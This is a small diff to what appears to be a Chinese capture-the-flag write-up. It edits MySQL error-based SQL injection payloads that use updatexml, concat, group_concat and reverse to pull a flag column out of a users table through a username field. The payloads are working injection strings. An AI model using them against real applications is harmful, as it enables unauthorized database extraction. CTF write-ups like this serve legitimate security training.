@@ -45,7 +45,7 @@ Date: 2021-1-5
 
      `username=peri0d"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#`
 
-     `username=peri0d"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#`
+     `username=peri0d"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f')))),1))#`
 
 ## 总结
 
